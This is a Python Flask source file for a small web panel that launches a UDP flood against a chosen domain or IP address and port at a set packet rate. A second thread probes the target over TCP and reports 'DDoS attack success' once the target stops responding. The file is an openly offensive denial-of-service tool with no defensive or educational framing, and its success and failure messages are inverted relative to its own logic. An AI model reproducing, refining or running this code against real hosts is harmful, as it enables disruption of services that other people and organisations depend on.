from flask import Flask, render_template, request, jsonify
import os
import socket
import threading
import time

app = Flask(__name__)

stop_attack = False
attack_interval = 5

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/start_attack', methods=['POST'])
def start_attack():
    global stop_attack
    data = request.json
    target = data.get('target', '')
    port = int(data.get('port', 80))
    rate = int(data.get('rate', 1))
    attack_type = data.get('attack_type', 'domain')

    if attack_type == 'ip':
        attack_thread = threading.Thread(target=attack_ip, args=(target, port, rate))
    else:
        attack_thread = threading.Thread(target=attack_domain, args=(target, port, rate))

    server_check_thread = threading.Thread(target=check_server, args=(target, port))

    attack_thread.start()
    server_check_thread.start()

    attack_thread.join()
    server_check_thread.join()

    if not stop_attack:
        return jsonify({"message": "DDOS attack failed. Press Control + C and try again."})
    else:
        return jsonify({"message": "DDoS attack successs!!!!!!"})

def attack_domain(domain, port, rate):
    global stop_attack
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = os.urandom(1024)
    target_ip = socket.gethostbyname(domain)
    while not stop_attack:
        sock.sendto(bytes, (target_ip, port))
        time.sleep(1 / rate)

def attack_ip(ip, port, rate):
    global stop_attack
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = os.urandom(1024)
    while not stop_attack:
        sock.sendto(bytes, (ip, port))
        time.sleep(1 / rate)

def check_server(target, port):
    global stop_attack
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while not stop_attack:
        try:
            sock.connect((target, port))
        except socket.error:
            stop_attack = True
        time.sleep(attack_interval)

if __name__ == '__main__':
    app.run(debug=True)
